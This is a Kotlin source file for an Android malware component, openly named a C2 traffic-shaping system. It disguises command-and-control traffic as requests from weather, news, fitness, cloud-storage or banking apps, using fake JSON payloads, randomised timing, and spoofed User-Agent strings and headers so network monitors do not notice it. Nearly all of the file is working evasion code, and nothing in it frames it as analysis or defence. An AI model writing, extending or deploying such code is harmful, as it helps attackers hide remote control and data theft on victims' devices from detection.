package com.c2.traffic

import android.content.Context
import android.util.Log
import okhttp3.*
import java.util.concurrent.TimeUnit
import kotlin.random.Random

/**
 * MAJOR: Traffic Shaping System
 * 
 * Purpose: Make C2 traffic blend in with legitimate app traffic
 * 
 * Problem: Raw C2 communication is detectably malicious:
 * - Consistent packet sizes
 * - Predictable timing
 * - Suspicious domains/IPs
 * - Unusual ports
 * - High data volume
 * 
 * Solution: Mimic legitimate app behavior
 * - If disguised as Weather app → make requests to weather APIs
 * - If disguised as News app → make requests to news sites
 * - If disguised as Fitness app → upload dummy health data
 * 
 * Traffic Profile: Define what "normal" looks like for this disguise
 */
class TrafficShapingSystem(private val context: Context) {
    
    companion object {
        const val TAG = "TrafficShaping"
    }
    
    /**
     * Traffic profiles for different app disguises
     */
    enum class AppDisguise(
        val realPackage: String,
        val fauxPackage: String,
        val trafficPattern: TrafficPattern
    ) {
        WEATHER(
            "com.google.android.apps.weather",
            "com.example.weatherapp",
            TrafficPattern(
                baseUrl = "https://api.weatherapi.com",
                endpoints = listOf("/current", "/forecast", "/alerts"),
                requestsPerHour = 6,  // Check weather ~6x per day
                avgPayloadSize = 2048,
                payloadVariance = 512
            )
        ),
        NEWS(
            "com.google.android.apps.news",
            "com.example.newsapp",
            TrafficPattern(
                baseUrl = "https://newsapi.org",
                endpoints = listOf("/top-headlines", "/everything", "/sources"),
                requestsPerHour = 4,
                avgPayloadSize = 8192,
                payloadVariance = 2048
            )
        ),
        FITNESS(
            "com.google.android.apps.fitness",
            "com.example.fitnessapp",
            TrafficPattern(
                baseUrl = "https://www.googleapis.com/fitness",
                endpoints = listOf("/v1/users/me/dataset:aggregate", "/v1/users/me/sessions"),
                requestsPerHour = 2,
                avgPayloadSize = 4096,
                payloadVariance = 1024
            )
        ),
        CLOUD_STORAGE(
            "com.google.android.apps.docs",
            "com.example.cloudstorage",
            TrafficPattern(
                baseUrl = "https://www.googleapis.com/drive",
                endpoints = listOf("/v3/files", "/v3/about"),
                requestsPerHour = 3,
                avgPayloadSize = 6144,
                payloadVariance = 1536
            )
        ),
        BANKING(
            "com.bank.mobile",
            "com.example.banking",
            TrafficPattern(
                baseUrl = "https://api.bank.com",
                endpoints = listOf("/accounts", "/transactions", "/balance"),
                requestsPerHour = 1,  // Less frequent, user-initiated
                avgPayloadSize = 2048,
                payloadVariance = 512
            )
        )
    }
    
    data class TrafficPattern(
        val baseUrl: String,
        val endpoints: List<String>,
        val requestsPerHour: Int,
        val avgPayloadSize: Int,
        val payloadVariance: Int
    )
    
    /**
     * Build HTTP client with traffic shaping
     */
    fun buildShapedHttpClient(disguise: AppDisguise): OkHttpClient {
        Log.d(TAG, "Building traffic-shaped client for: ${disguise.fauxPackage}")
        
        val pattern = disguise.trafficPattern
        
        return OkHttpClient.Builder()
            .addInterceptor(TrafficShapingInterceptor(pattern))
            .addInterceptor(UserAgentInterceptor(disguise))
            .addInterceptor(HeaderSpoofingInterceptor(disguise))
            .connectTimeout(getRandomTimeout(), TimeUnit.SECONDS)
            .readTimeout(getRandomTimeout(), TimeUnit.SECONDS)
            .writeTimeout(getRandomTimeout(), TimeUnit.SECONDS)
            .build()
    }
    
    /**
     * Calculate next request time based on traffic pattern
     * Avoids making requests at predictable intervals
     */
    fun getNextRequestDelay(pattern: TrafficPattern): Long {
        val avgDelay = 3600000L / pattern.requestsPerHour // milliseconds
        val jitter = Random.nextLong(-avgDelay / 4, avgDelay / 4)
        
        return (avgDelay + jitter).coerceAtLeast(1000)
    }
    
    /**
     * Generate fake payload for disguise
     * Makes request appear legitimate to network monitors
     */
    fun generateFakePayload(disguise: AppDisguise): ByteArray {
        val pattern = disguise.trafficPattern
        val size = pattern.avgPayloadSize + Random.nextInt(
            -pattern.payloadVariance,
            pattern.payloadVariance
        )
        
        return when (disguise) {
            AppDisguise.WEATHER -> generateWeatherPayload(size)
            AppDisguise.NEWS -> generateNewsPayload(size)
            AppDisguise.FITNESS -> generateFitnessPayload(size)
            AppDisguise.CLOUD_STORAGE -> generateCloudStoragePayload(size)
            AppDisguise.BANKING -> generateBankingPayload(size)
        }
    }
    
    /**
     * Legitimate-looking weather API response payload
     */
    private fun generateWeatherPayload(size: Int): ByteArray {
        val json = """
        {
            "location": {
                "name": "New York",
                "region": "New York",
                "country": "United States",
                "lat": 40.71,
                "lon": -74.01,
                "tz_id": "America/New_York",
                "localtime_epoch": ${System.currentTimeMillis() / 1000},
                "localtime": "2024-09-25 10:30"
            },
            "current": {
                "last_updated_epoch": ${System.currentTimeMillis() / 1000},
                "last_updated": "2024-09-25 10:30",
                "temp_c": 22,
                "temp_f": 72,
                "is_day": 1,
                "condition": {
                    "text": "Partly cloudy",
                    "icon": "//cdn.weatherapi.com/weather/128x128/day/partly_cloudy.png",
                    "code": 1003
                },
                "wind_mph": 7.8,
                "wind_kph": 12.5,
                "humidity": 65,
                "feelslike_c": 21,
                "feelslike_f": 70,
                "visibility_km": 10,
                "visibility_miles": 6,
                "uv": 5.5,
                "gust_mph": 15,
                "gust_kph": 24
            }
        }
        """.toByteArray()
        
        // Pad to size
        return padPayload(json, size)
    }
    
    /**
     * Legitimate-looking news API response
     */
    private fun generateNewsPayload(size: Int): ByteArray {
        val json = """
        {
            "status": "ok",
            "totalResults": 38,
            "articles": [
                {
                    "source": {"id": "cnn", "name": "CNN"},
                    "author": "Reporter Name",
                    "title": "Breaking news headline here",
                    "description": "This is a description of the news article.",
                    "url": "https://news.example.com/article",
                    "urlToImage": "https://news.example.com/image.jpg",
                    "publishedAt": "${System.currentTimeMillis()}",
                    "content": "Full article content would go here with substantial text to fill space and appear legitimate to traffic monitors."
                }
            ]
        }
        """.toByteArray()
        
        return padPayload(json, size)
    }
    
    /**
     * Legitimate-looking fitness data payload
     */
    private fun generateFitnessPayload(size: Int): ByteArray {
        val json = """
        {
            "bucket": [
                {
                    "startTime": "${System.currentTimeMillis() / 1000}",
                    "endTime": "${(System.currentTimeMillis() + 3600000) / 1000}",
                    "dataset": [
                        {
                            "dataTypeName": "com.google.step_count.delta",
                            "point": [
                                {"startTime": "${System.currentTimeMillis() / 1000}", "value": [{"intVal": 8432}]}
                            ]
                        },
                        {
                            "dataTypeName": "com.google.heart_rate.bpm",
                            "point": [
                                {"startTime": "${System.currentTimeMillis() / 1000}", "value": [{"fpVal": 72.5}]}
                            ]
                        }
                    ]
                }
            ]
        }
        """.toByteArray()
        
        return padPayload(json, size)
    }
    
    /**
     * Legitimate-looking cloud storage response
     */
    private fun generateCloudStoragePayload(size: Int): ByteArray {
        val json = """
        {
            "kind": "drive#fileList",
            "etag": "\"p33g06cbcbchk\"",
            "files": [
                {
                    "kind": "drive#file",
                    "id": "file-id-12345",
                    "name": "Document.docx",
                    "mimeType": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                    "parents": ["drive-root-id"],
                    "webViewLink": "https://drive.google.com/file/d/file-id/view",
                    "modifiedTime": "${System.currentTimeMillis()}",
                    "size": 524288
                }
            ]
        }
        """.toByteArray()
        
        return padPayload(json, size)
    }
    
    /**
     * Legitimate-looking banking response
     */
    private fun generateBankingPayload(size: Int): ByteArray {
        val json = """
        {
            "status": "success",
            "accounts": [
                {
                    "accountId": "****1234",
                    "accountType": "Checking",
                    "balance": 5432.10,
                    "currency": "USD",
                    "lastUpdated": "${System.currentTimeMillis()}"
                }
            ],
            "recentTransactions": [
                {
                    "id": "txn-12345",
                    "amount": 45.50,
                    "description": "Coffee Shop",
                    "date": "${System.currentTimeMillis()}",
                    "merchant": "Local Cafe",
                    "category": "Food & Drink"
                }
            ]
        }
        """.toByteArray()
        
        return padPayload(json, size)
    }
    
    /**
     * Pad payload to specific size with random data
     */
    private fun padPayload(data: ByteArray, targetSize: Int): ByteArray {
        if (data.size >= targetSize) return data
        
        val padding = ByteArray(targetSize - data.size)
        Random.nextBytes(padding)
        
        return data + padding
    }
    
    private fun getRandomTimeout(): Long {
        return Random.nextLong(10, 60)
    }
}

/**
 * Interceptor that shapes traffic timing
 */
class TrafficShapingInterceptor(
    private val pattern: TrafficShapingSystem.TrafficPattern
) : Interceptor {
    
    override fun intercept(chain: Interceptor.Chain): Response {
        val request = chain.request()
        
        // Add jitter to request timing
        val delayMs = Random.nextLong(100, 500)
        Thread.sleep(delayMs)
        
        // Proceed with request
        return chain.proceed(request)
    }
}

/**
 * Spoof User-Agent to match disguised app
 */
class UserAgentInterceptor(private val disguise: TrafficShapingSystem.AppDisguise) : Interceptor {
    
    override fun intercept(chain: Interceptor.Chain): Response {
        val originalRequest = chain.request()
        
        val userAgent = when (disguise) {
            TrafficShapingSystem.AppDisguise.WEATHER ->
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 WeatherApp/1.0"
            TrafficShapingSystem.AppDisguise.NEWS ->
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 NewsApp/2.1"
            TrafficShapingSystem.AppDisguise.FITNESS ->
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 FitnessTracker/3.0"
            TrafficShapingSystem.AppDisguise.CLOUD_STORAGE ->
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 CloudSync/2.5"
            TrafficShapingSystem.AppDisguise.BANKING ->
                "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 BankingApp/4.2"
        }
        
        val newRequest = originalRequest.newBuilder()
            .header("User-Agent", userAgent)
            .build()
        
        return chain.proceed(newRequest)
    }
}

/**
 * Add legitimate-looking headers for disguise
 */
class HeaderSpoofingInterceptor(private val disguise: TrafficShapingSystem.AppDisguise) : Interceptor {
    
    override fun intercept(chain: Interceptor.Chain): Response {
        val originalRequest = chain.request()
        
        val newRequest = originalRequest.newBuilder()
            .header("Accept", "application/json, text/plain, */*")
            .header("Accept-Language", "en-US,en;q=0.9")
            .header("Accept-Encoding", "gzip, deflate, br")
            .header("DNT", "1")
            .header("Connection", "keep-alive")
            .header("Sec-Fetch-Dest", "document")
            .header("Sec-Fetch-Mode", "navigate")
            .header("Sec-Fetch-Site", "none")
            .header("Cache-Control", "max-age=0")
            .header("Upgrade-Insecure-Requests", "1")
            .build()
        
        return chain.proceed(newRequest)
    }
}

/**
 * Request scheduler that respects traffic patterns
 */
class TrafficPatternScheduler(
    private val trafficSystem: TrafficShapingSystem,
    private val pattern: TrafficShapingSystem.TrafficPattern,
    private val onRequest: (ByteArray) -> Unit
) {
    
    fun startScheduledRequests() {
        val delay = trafficSystem.getNextRequestDelay(pattern)
        
        kotlinx.coroutines.GlobalScope.launch {
            while (true) {
                kotlinx.coroutines.delay(delay)
                
                val payload = trafficSystem.generateFakePayload(
                    // Get appropriate disguise based on pattern
                    TrafficShapingSystem.AppDisguise.WEATHER
                )
                
                onRequest(payload)
            }
        }
    }
}
